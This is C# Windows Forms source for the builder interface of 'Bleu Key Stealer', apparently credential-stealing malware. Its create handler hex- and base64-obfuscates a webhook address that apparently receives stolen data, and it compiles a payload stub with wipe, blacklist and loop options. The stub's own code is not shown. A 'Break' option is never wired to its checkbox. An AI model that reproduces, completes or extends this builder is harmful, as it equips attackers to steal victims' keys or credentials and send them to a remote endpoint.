using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BKS_GUI
{
    public partial class BKS : Form
    {

        public BKS()
        {
            InitializeComponent();
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
           
            this.Close();
        }

        private void MinimizeBtn_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void Drag(object sender, MouseEventArgs e)
        {

            Drag Drag = new Drag();
            Drag.MoveForm(Handle);
        }

        private void CreateBtn_Click(object sender, EventArgs e)
        {
            if (TagTxt.TextLength <= 2)
            {
                MessageBox.Show("Tag too short!", "BKS v0.91", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            bool Wipe = false;
            bool Blacklist = false;
            bool Loop = false;
            bool Break = false;
            string Web = Convert.ToBase64String((new ASCIIEncoding()).GetBytes(WebhkTxt.Text)).ToCharArray().Select(x => String.Format("{0:X}", (int)x)).Aggregate(new StringBuilder(), (x, y) => x.Append(y)).ToString();
            Wipe = WipeCb.Checked == true;
            Blacklist = ReplaceCb.Checked == true;
            Loop = LoopCb.Checked == true;
            Stub.Compile( Wipe, Blacklist, Loop , TagTxt.Text , Web, Break);
        }

        private void ReplaceCb_CheckedChanged(object sender, EventArgs e)
        {
            if (ReplaceCb.Checked == true) { WipeCb.Checked = false; WipeCb.Enabled = false; BreakCb.Checked = false; BreakCb.Enabled = false; } else { WipeCb.Enabled = true; BreakCb.Enabled = true; }
        }

        private void WipeCb_CheckedChanged(object sender, EventArgs e)
        {
            if (WipeCb.Checked == true) { ReplaceCb.Checked = false; ReplaceCb.Enabled = false; BreakCb.Checked = false; BreakCb.Enabled = false; } else { ReplaceCb.Enabled = true; BreakCb.Enabled = true;  }
        }

        private void BKS_Load(object sender, EventArgs e)
        {
            
            MessageBox.Show("Welcome to Bleu Key Stealer, by YourAverageUser.", "Welcome to BKS");
        }

        private void BreakCb_CheckedChanged(object sender, EventArgs e)
        {
            if (BreakCb.Checked == true) { ReplaceCb.Checked = false; ReplaceCb.Enabled = false; WipeCb.Checked = false; WipeCb.Enabled = false; } else { ReplaceCb.Enabled = true; WipeCb.Enabled = true; }
        }
    }
}
